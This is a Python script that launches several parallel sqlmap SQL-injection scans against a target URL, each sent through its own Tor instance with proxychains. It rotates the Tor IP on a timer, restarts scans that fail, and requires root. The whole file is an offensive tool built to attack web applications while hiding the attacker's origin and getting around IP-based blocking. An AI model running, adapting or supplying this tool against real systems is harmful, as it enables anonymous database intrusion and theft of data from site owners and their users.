#!/usr/bin/env python3

import os
import sys
import time
import subprocess
import argparse
import re
import signal
import threading
import random
from datetime import datetime

# Global variables to track processes and instances
running_processes = []
tor_instances = []

def run_command(command):
    """Run a shell command and return the output"""
    try:
        result = subprocess.run(command, shell=True, check=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {command}")
        print(f"Error message: {e.stderr}")
        return None

def setup_tor_instances(num_instances=5):
    """Setup Tor instances or use existing ones"""
    global tor_instances

    # Check if tor_proxy_setup.py exists
    if not os.path.exists('./tor_proxy_setup.py'):
        print("[!] tor_proxy_setup.py not found in the current directory.")
        sys.exit(1)

    print(f"[*] Setting up {num_instances} Tor instances...")

    # Run the tor_proxy_setup.py script to set up multiple instances
    result = run_command(f"sudo python3 ./tor_proxy_setup.py --multi-tor {num_instances}")

    # Parse the output to get instance information
    tor_instances = []
    for i in range(1, num_instances+1):
        socks_port = 9050 + i
        control_port = 9051 + i
        tor_instances.append({"instance": i, "socks_port": socks_port, "control_port": control_port})

    print(f"[+] Successfully set up {num_instances} Tor instances")
    return tor_instances

def rotate_tor_ip(instance):
    """Rotate IP for a specific Tor instance"""
    instance_num = instance["instance"]
    control_port = instance["control_port"]

    print(f"[*] Rotating IP for Tor instance {instance_num}...")
    run_command(f"sudo python3 ./tor_proxy_setup.py --rotate --instance {instance_num}")

def monitor_and_restart_sqlmap(cmd, instance, payload, target_url, interval, log_file):
    """Monitor sqlmap and restart if it dies"""
    global running_processes

    instance_num = instance["instance"]
    socks_port = instance["socks_port"]
    proxychains_conf = f"/etc/proxychains4.conf.{socks_port}"

    print(f"[*] Starting sqlmap on instance {instance_num} with port {socks_port}")

    while True:
        try:
            # Construct the full command
            full_cmd = f"proxychains4 -f {proxychains_conf} {cmd}"

            # Log the command
            with open(log_file, "a") as f:
                f.write(f"\n[{datetime.now()}] Starting sqlmap on instance {instance_num}:\n{full_cmd}\n")

            # Start the process
            process = subprocess.Popen(full_cmd, shell=True)

            # Add to running processes
            running_processes.append({"process": process, "instance": instance_num, "cmd": full_cmd})

            # Wait for the process to complete or until interval
            start_time = time.time()
            while process.poll() is None:
                # Check if it's time to rotate IP
                if interval > 0 and time.time() - start_time >= interval:
                    print(f"[*] Rotating IP for instance {instance_num} after {interval} seconds")
                    rotate_tor_ip(instance)
                    start_time = time.time()

                time.sleep(1)

            # If process ended with non-zero exit code, it failed
            if process.returncode != 0:
                print(f"[!] sqlmap process on instance {instance_num} exited with code {process.returncode}. Restarting...")
                with open(log_file, "a") as f:
                    f.write(f"[{datetime.now()}] sqlmap on instance {instance_num} exited with code {process.returncode}. Restarting...\n")
            else:
                print(f"[+] sqlmap process on instance {instance_num} completed successfully")
                with open(log_file, "a") as f:
                    f.write(f"[{datetime.now()}] sqlmap on instance {instance_num} completed successfully\n")
                break

        except KeyboardInterrupt:
            print("\n[!] Keyboard interrupt detected. Exiting...")
            sys.exit(0)
        except Exception as e:
            print(f"[!] Error in sqlmap process on instance {instance_num}: {str(e)}. Restarting...")
            with open(log_file, "a") as f:
                f.write(f"[{datetime.now()}] Error in sqlmap on instance {instance_num}: {str(e)}. Restarting...\n")

        # Remove process from running_processes
        running_processes = [p for p in running_processes if p["process"] != process]

        # Wait before restarting
        time.sleep(5)

def signal_handler(sig, frame):
    """Handle Ctrl+C to cleanly exit"""
    print("\n[!] Stopping all running processes...")
    for proc_info in running_processes:
        proc = proc_info["process"]
        instance_num = proc_info["instance"]
        print(f"[*] Terminating sqlmap process on instance {instance_num}")
        try:
            proc.terminate()
            time.sleep(1)
            if proc.poll() is None:
                proc.kill()
        except:
            pass

    sys.exit(0)

def main():
    parser = argparse.ArgumentParser(description="Multi-threaded SQLMap Runner with Tor Proxies")
    parser.add_argument("-i", "--instances", type=int, default=5, help="Number of Tor instances to use (default: 5)")
    parser.add_argument("-u", "--url", required=True, help="Target URL for sqlmap")
    parser.add_argument("-p", "--payload", help="Additional sqlmap parameters (e.g., '--dbs --level=5')")
    parser.add_argument("-r", "--rotate", type=int, default=60, help="IP rotation interval in seconds (0 to disable, default: 60)")
    parser.add_argument("-l", "--log", default="/tmp/multi_sqlmap.log", help="Log file path (default: /tmp/multi_sqlmap.log)")

    args = parser.parse_args()

    # Register signal handler for clean exit
    signal.signal(signal.SIGINT, signal_handler)

    # Setup logging
    with open(args.log, "w") as f:
        f.write(f"[{datetime.now()}] Starting Multi-threaded SQLMap Runner\n")
        f.write(f"Target URL: {args.url}\n")
        f.write(f"Number of instances: {args.instances}\n")
        f.write(f"IP rotation interval: {args.rotate} seconds\n")

    # Setup Tor instances
    instances = setup_tor_instances(args.instances)

    # Prepare sqlmap command
    base_cmd = f"sqlmap -u \"{args.url}\" --batch --random-agent"
    if args.payload:
        base_cmd += f" {args.payload}"

    # Start a thread for each instance
    threads = []
    for instance in instances:
        thread = threading.Thread(
            target=monitor_and_restart_sqlmap,
            args=(base_cmd, instance, args.payload, args.url, args.rotate, args.log)
        )
        thread.daemon = True
        threads.append(thread)
        thread.start()
        time.sleep(2)  # Small delay between thread starts

    # Keep the main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt detected. Exiting...")
        sys.exit(0)

if __name__ == "__main__":
    # Check if script is run with root privileges
    if os.geteuid() != 0:
        print("[!] This script requires root privileges.")
        print("[!] Please run with sudo or as root.")
        sys.exit(1)

    main()
